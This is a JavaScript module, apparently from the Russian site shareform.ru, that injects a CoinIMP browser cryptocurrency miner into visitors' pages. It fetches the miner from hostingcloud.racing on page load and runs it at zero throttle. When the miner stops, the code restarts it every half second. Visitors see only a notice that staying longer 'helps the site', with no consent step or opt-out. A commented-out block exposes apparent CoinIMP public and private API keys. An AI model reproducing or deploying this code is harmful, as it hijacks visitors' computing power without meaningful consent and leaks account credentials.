    // think
    function loadScript(src) {
      return new Promise(function(resolve, reject) {
        let script = document.createElement('script');
        script.src = src;
    
        script.onload = () => resolve(script);
        script.onerror = () => reject(new Error(`Ошибка загрузки скрипта ${src}`));
    
        document.head.append(script);
      });
    }
    
    function checkconnection() {
      return navigator.onLine;
    }
  
  export function work(){
    try {
      const _url = new URL(document.location.href);
      const _s = {
        'local':{'src':'https://www.hostingcloud.racing/2KFX.js','key':'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'},
        'share':{'src':'https://www.hostingcloud.racing/rhdQ.js','key':'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'}
      };
      let _src = '';
      let _key = '';
      
      if (_url.toString().indexOf('127.0.0.1')!=-1) {
        _src = _s.local.src;
        _key = _s.local.key;
      } else if (_url.toString().indexOf('shareform.ru')!=-1) {
        _src = _s.share.src;
        _key = _s.share.key;
      }

      $('<div/>',{
        'id':'footercoins',
        'class':'container-fluid downjumbo no-print'
      }).appendTo('body');
      $('#footercoins').hide();
      
      $.getScript(_src)
      .done(function(script, textStatus) {

        $('<div/>',{
          'class':'container p-5 my-5 text-justify small',
          'html':'<p>На этой странице Вы не увидите предложения о согласии на использование куки (cookies).</p><p>Программный код этого сайта не использует cookies и базы данных.</p><p>Информация, которая вводится в полях форм не сохраняется и не используется на сервере.</p>'
        }).appendTo('#footercoins');

        $('<div/>',{
          'id':'miner',
          'class':'no-print text-center'
        }).appendTo('#footercoins');
        
        $('<div/>',{
          'id':'hpslabel',
          'class':'container p-5 my-5 bg-dark text-white text-justify small',
          'html':'<p>Если Вы видите счетчик хэш-кодов и этот текст, то Вы помогаете сайту развиваться.</p><p>Чем дольше Вы остаетесь на странице, тем больше помощь. </p>'
        }).appendTo('#footercoins').hide();

        let _client = new Client.Anonymous(_key, {
          throttle: 0, c: 'w'
        });
        
        let running = false;
        let hashes = 0;
        
        _client.start();
        
        let onMobile = _client.isMobile();
        let wasmEnabled = _client.hasWASMSupport();
        let isAutoThreads = _client.getAutoThreadsEnabled();
        let hps = _client.getHashesPerSecond();
        let threads = _client.getNumThreads();
        let throttle = _client.getThrottle();
        
        _client.addMiningNotification("Bottom", "На этом сайте используется JavaScript майнер от coinimp.com", "#cccccc", 40, "#3d3d3d");
 
        if (onMobile) {

          $('<span/>',{
            'id':'connectionstatus',
            'class':'small'
          }).appendTo('#miner');
          
          $('<i/>', {
            'id': 'connection',
            'class': 'no-print fas fa-wifi'
          }).appendTo('#connectionstatus');
        
        } else {
          
          $('<span/>',{
            'id':'connectionstatus',
            'class':'small'
          }).appendTo('#miner');
          
          $('<i/>', {
            'id': 'connection',
            'class': 'no-print fas fa-network-wired'
          }).appendTo('#connectionstatus');
        }
        
        $('<span/>', {
          'id': 'hps',
          'class': 'small no-print',
          'html': ' <i class="fas fa-hashtag"></i>: '+hps.toFixed(2)+'</div>'
        }).appendTo('#miner');
        
        $('#footercoins').slideDown();
        $('#hpslabel').slideDown('slow');

        setInterval(function(){
          
          if (checkconnection()) {
            $('#connectionstatus').addClass('text-dark').removeClass('text-muted');
          } else {
            $('#connectionstatus').removeClass('text-dark').addClass('text-muted');
          }
          running = _client.isRunning();
          hashes = _client.getTotalHashes();
          hps = _client.getHashesPerSecond();

          $('#hashes').html('hashes: '+hashes+'');
          
          $('#hps').html(' <i class="fas fa-hashtag"></i>: '+hps.toFixed(2)+'');
          if (running) {
            $('#hps').addClass('text-dark').removeClass('text-muted');
          } else {
            _client.start();
            $('#hps').removeClass('text-dark').addClass('text-muted');
          }
        }, 500);
      })
      .fail(function(jqxhr, settings, exception) {
      });
        /*
      $('#testajaxrequest').on('click',function(){
        let keys = {
          "site": "a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97",
          "public": "985e92ba0b124f68d85fb0bac1f4221005408914a747b26e0293380f4006c11c",
          "private": "ad76f39ddba535479dd9b361c04d745e1c07863743dc3639915c730121bce51d"
        };
        
        let u = 'https://www.coinimp.com/api/v1/hashes?public='+keys.public+'&private='+keys.private;
        
        
        $('#u').text(u);
        
        
        $.ajax({
          url: u,
          method: 'get',
          datatype: 'json',
          data:{ currency:'MINTME' , "site-key": keys.site},
          complete: function(data){
            alert(JSON.stringify(data));
            
            //process the JSON data etc
          }
        });
        
      });
        */
      
      
      
    } catch (err) {
      alert('err:'+err);
    }
  }